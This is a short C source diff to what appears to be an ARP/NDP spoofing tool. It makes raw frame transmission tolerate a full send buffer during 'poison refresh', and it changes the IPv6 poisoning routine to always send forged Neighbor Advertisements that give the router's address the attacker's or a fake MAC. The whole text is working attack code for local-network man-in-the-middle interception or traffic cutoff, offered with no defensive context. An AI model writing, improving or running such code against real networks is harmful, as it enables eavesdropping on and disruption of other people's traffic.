@@ -13,7 +13,12 @@ void send_frame(const unsigned char *dstmac, const unsigned char *srcmac,
     struct sockaddr_ll d; memset(&d,0,sizeof d);
     d.sll_family=AF_PACKET; d.sll_ifindex=g_ifidx; d.sll_halen=6; d.sll_protocol=htons(ethertype);
     memcpy(d.sll_addr,dstmac,6);
-    if(sendto(g_sock,pkt,14+plen,0,(struct sockaddr*)&d,sizeof d)<0) perror("sendto");
+    ssize_t r=sendto(g_sock,pkt,14+plen,0,(struct sockaddr*)&d,sizeof d);
+    if(r>=0) g_frames++;
+    else if(errno==EAGAIN||errno==ENOBUFS||errno==EWOULDBLOCK||errno==ENETDOWN) g_drops++;
+    else perror("sendto");
+    /* EAGAIN/ENOBUFS: the TX ring is momentarily full. Dropping is correct for
+       a poison refresh; blocking here is what used to wedge the whole tool. */
 }
 
 void send_arp(int op, const unsigned char *dstmac, unsigned int spa,
@@ -105,13 +110,9 @@ void ndp_na(const unsigned char *dstmac, const unsigned char *src_ll,
     send_frame(dstmac, src_mac, p, 40+32, 0x86DD);
 }
 
-void ndp_poison(const struct host *h, int cut){
+void ndp_poison(const struct host *h){
     if(!g_do_v6 || !g_v6_ok) return;
     unsigned char vic_ll[16]; eui64_ll(h->mac, vic_ll);
     const unsigned char *sender = g_use_fake ? g_fake_mac : g_mymac;
-    if(cut){
-        ndp_na(h->mac, g_router_ll, vic_ll, g_router_ll, sender, sender);
-    } else {
-        ndp_na(h->mac, g_router_ll, vic_ll, g_router_ll, g_gwmac, g_mymac);
-    }
+    ndp_na(h->mac, g_router_ll, vic_ll, g_router_ll, sender, sender);
 }
